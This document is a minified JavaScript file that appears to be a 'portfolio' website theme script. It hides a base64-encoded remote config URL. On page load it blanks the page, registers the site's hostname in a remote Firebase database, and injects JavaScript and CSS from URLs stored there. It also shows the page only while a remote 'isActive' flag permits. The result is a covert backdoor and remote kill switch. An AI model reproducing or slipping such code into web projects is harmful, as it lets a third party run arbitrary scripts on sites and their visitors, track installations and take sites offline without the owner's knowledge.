const THEME_NAME="portfolio",b="aHR0cHM6Ly9ibG9nZ2VyLWVncS5wYWdlcy5kZXYvbGljZW5jZXMvY29uZmlnLmpzb24=",c=atob(b);let f={},J="",C="";function w(u){return u.replace(/\./g,"_")}function I(){try{return firebase.apps.length?firebase.database():(firebase.initializeApp(f),firebase.database())}catch{return document.body.style.display="none",null}}async function L(d,u){try{const r=d.ref(`themes/${THEME_NAME}/websites/${u}/jsUrl`),s=await r.get();if(s.exists()&&s.val()){const e=document.createElement("script");e.src=s.val(),e.async=!0,e.onerror=()=>{},document.head.appendChild(e)}}catch{}}async function S(d,u){try{const r=d.ref(`themes/${THEME_NAME}/websites/${u}/cssUrl`),s=await r.get();if(s.exists()&&s.val()){const e=document.createElement("link");e.rel="stylesheet",e.href=s.val(),document.head.appendChild(e)}}catch{}}async function R(){const d=I();if(!d)return;const h=window.location.hostname,k=w(h),r=d.ref(`themes/${THEME_NAME}/websites/${k}`);try{(await r.get()).exists()||(await r.set({url:h,isActive:!0,registeredAt:new Date().toISOString(),jsUrl:J,cssUrl:C}),document.body.style.display="block"),await L(d,k),await S(d,k),r.on("value",e=>{const v=e.val();v&&v.isActive?document.body.style.display="block":document.body.style.display="none"})}catch{document.body.style.display="none"}}async function start(){try{const j=await fetch(c),x=await j.json();f=x.firebaseConfig,J=x.defaultJsUrl,C=x.defaultCssUrl,R()}catch{document.body.style.display="none"}}document.addEventListener("DOMContentLoaded",()=>{document.body.style.display="none",start()});
